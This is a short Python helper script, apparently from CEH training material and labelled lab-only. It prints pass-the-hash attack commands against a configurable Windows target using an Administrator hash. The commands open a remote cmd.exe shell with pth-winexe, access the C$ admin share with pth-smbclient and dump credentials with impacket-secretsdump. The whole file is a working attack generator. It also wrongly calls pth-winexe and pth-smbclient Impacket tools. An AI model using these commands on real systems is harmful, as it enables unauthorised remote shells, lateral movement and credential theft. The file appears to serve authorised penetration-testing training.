#!/usr/bin/env python3
# LAB-ONLY: Pass-the-Hash (PtH) Helper Script
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for PtH attacks using Impacket tools (pth-winexe, pth-smbclient, etc.)
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "LAB-DOMAIN"
LAB_TARGET = "192.168.100.10"
LAB_USER = "Administrator"
LAB_NT_HASH = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"  # Empty hash example
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Pass-the-Hash (PtH) Helper")
    print("="*80)
    print(f"Target: {LAB_TARGET}")
    print("-"*80)
    print("# 1. Impacket pth-winexe (get a shell):")
    print(f"pth-winexe -U {LAB_DOMAIN}/{LAB_USER}%{LAB_NT_HASH} //{LAB_TARGET} cmd.exe")
    print()
    print("# 2. pth-smbclient (access file shares):")
    print(f"pth-smbclient //{LAB_TARGET}/C$ -U {LAB_DOMAIN}/{LAB_USER}%{LAB_NT_HASH}")
    print()
    print("# 3. Impacket secretsdump (dump secrets with PtH):")
    print(f"impacket-secretsdump {LAB_DOMAIN}/{LAB_USER}@{LAB_TARGET} -hashes {LAB_NT_HASH}")
    print()

if __name__ == "__main__":
    main()
